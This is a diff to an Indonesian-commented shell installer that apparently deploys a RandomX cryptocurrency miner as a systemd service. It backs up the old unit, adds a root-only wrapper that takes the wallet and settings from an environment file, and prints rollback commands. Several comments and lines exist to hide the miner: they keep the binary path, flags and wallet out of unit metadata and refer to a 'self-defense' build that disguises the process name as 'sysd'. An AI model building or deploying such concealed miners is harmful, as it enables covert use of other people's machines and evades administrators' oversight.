@@ -164,6 +164,13 @@ if [ -f "${PREFIX}/xcb" ]; then
     fi
     log "backup lama: ${PREFIX}/xcb.bak-${STAMP}"
 fi
+# Unit lama ikut dibackup: unit baru memakai wrapper + EnvironmentFile, jadi
+# rollback binary saja akan meninggalkan unit yang tidak cocok dengan binary
+# lama (binary pra-PR #20 tidak membaca WALLET di jalur CONN).
+if [ -f "$UNIT" ]; then
+    run cp -a "$UNIT" "${UNIT}.bak-${STAMP}"
+    log "backup unit: ${UNIT}.bak-${STAMP}"
+fi
 
 run install -d -m 0755 "$PREFIX"
 run install -m 0755 "${SRC}/xcb" "${PREFIX}/xcb"
@@ -173,13 +180,25 @@ if [ -f "${SRC}/VERSION" ]; then
 fi
 
 # Wrapper root-only supaya ExecStart dan `systemctl show` tidak memuat path
-# binary atau flag. Isinya membaca WORKER/THREADS dari miner.env.
+# binary atau flag. Nilai diambil dari environment file saat runtime.
 run install -d -m 0755 "$(dirname "$WRAPPER")"
 if [ "$DRY" -eq 1 ]; then
     printf '[dry-run] tulis %s (0700)\n' "$WRAPPER"
 else
     cat > "$WRAPPER" <<'EOF'
 #!/bin/sh
+# Wrapper root-only untuk ExecStart. Semua nilai datang dari
+# /etc/xcb/miner.env (EnvironmentFile); tidak ada wallet di command line.
+set -eu
+: "${WALLET:?WALLET kosong di /etc/xcb/miner.env}"
+: "${WORKER:?WORKER kosong di /etc/xcb/miner.env}"
+: "${THREADS:?THREADS kosong di /etc/xcb/miner.env}"
+# Binary lama (pra-PR #20) hanya membaca CONN_ADDRESS di jalur CONN; binary
+# baru memakai WALLET sebagai fallback. Menyalin WALLET ke CONN_ADDRESS
+# menyamakan keduanya sehingga rollback binary lama tetap memakai alamat
+# reward yang sama.
+CONN_ADDRESS="$WALLET"
+export CONN_ADDRESS
 exec /usr/local/bin/xcb -a conn --worker "$WORKER" -t "$THREADS" --ui=log
 EOF
     chmod 0700 "$WRAPPER"
@@ -214,7 +233,12 @@ if [ "$DRY" -eq 0 ]; then
     sleep 5
     log "status: $(systemctl is-active "$SVC")"
     log "cek log: journalctl -u ${SVC} -n 30 --no-pager"
-    log "cek proses: ps -eo pid,ppid,comm,args | grep '[s]ysd'"
+    # Nama proses tetap xcb sampai XCB_TITLE aktif (butuh build self-defense);
+    # tanpa itu wrapper hanya menyembunyikan path dan flag dari unit metadata.
+    log "cek proses: ps -eo pid,ppid,comm,args | grep -E '[x]cb|[s]ysd'"
+    if [ -f "${PREFIX}/xcb.bak-${STAMP}" ]; then
+        log "rollback: install -m 0755 ${PREFIX}/xcb.bak-${STAMP} ${PREFIX}/xcb && install -m 0755 ${PREFIX}/librandomx_v2.so.bak-${STAMP} ${PREFIX}/librandomx_v2.so && install -m 0644 ${UNIT}.bak-${STAMP} ${UNIT} && systemctl daemon-reload && systemctl restart ${SVC}"
+    fi
 else
     log "dry-run selesai; tidak ada perubahan"
 fi
